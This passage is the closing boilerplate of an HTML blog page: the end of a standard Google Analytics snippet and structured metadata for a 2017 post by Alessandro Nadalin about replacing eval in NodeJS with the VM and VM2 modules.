      m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
      })(window,document,'script','//www.google-analytics.com/analytics.js','ga');

      ga('create', 'UA-7407627-3', 'auto');
      ga('send', 'pageview');
	</script>
	
	<script type="application/ld+json">
		{
		"@context": "https://schema.org/",
		"@type": "BlogPosting",
		"mainEntityOfPage": {
			"@type": "WebPage",
			"@id": "https://odino.org/eval-no-more-understanding-vm-vm2-nodejs/"
		},
		"headline": "Eval no more: a journey through NodeJS' VM module, VM2 and Expression Language",
		"description": "A safer alternative to implement expression parsers in NodeJS: let's look at eval, VM and VM2.",
		
		"author": {
			"@type": "Person",
			"name": "Alessandro Nadalin"
		},
		"datePublished": "2017-03-04 21:28:00 +0000"
		}
	</script>
	
	</body>
</html>
<!-- END _layouts/default.html -->
